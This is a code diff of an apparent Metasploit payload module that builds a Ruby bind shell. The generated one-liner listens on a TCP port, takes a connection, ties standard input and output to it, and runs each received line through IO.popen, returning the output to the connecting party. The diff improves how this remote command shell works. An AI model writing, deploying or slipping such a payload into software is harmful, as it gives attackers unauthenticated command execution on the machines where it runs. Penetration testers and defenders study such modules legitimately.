@@ -6,6 +6,7 @@
 ##
 
 require 'msf/core'
+require 'msf/core/payload/ruby'
 require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
@@ -13,6 +14,7 @@ require 'msf/base/sessions/command_shell_options'
 module Metasploit3
 
 	include Msf::Payload::Single
+	include Msf::Payload::Ruby
 	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
@@ -31,10 +33,12 @@ module Metasploit3
 	end
 
 	def generate
-		return super + ruby_string
+		return prepends(ruby_string)
 	end
 
 	def ruby_string
-		"require 'socket';s=TCPServer.new(\"::\",\"#{datastore['LPORT']}\");c=s.accept;s.close;$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l=l.strip;next if l.length==0;system(l)}"
+		"require 'socket';s=TCPServer.new(\"::\",#{datastore['LPORT'].to_i});c=s.accept;s.close;" +
+		"$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l=l.strip;next if l.length==0;" +
+		"(IO.popen(l,\"rb\"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }"
 	end
 end
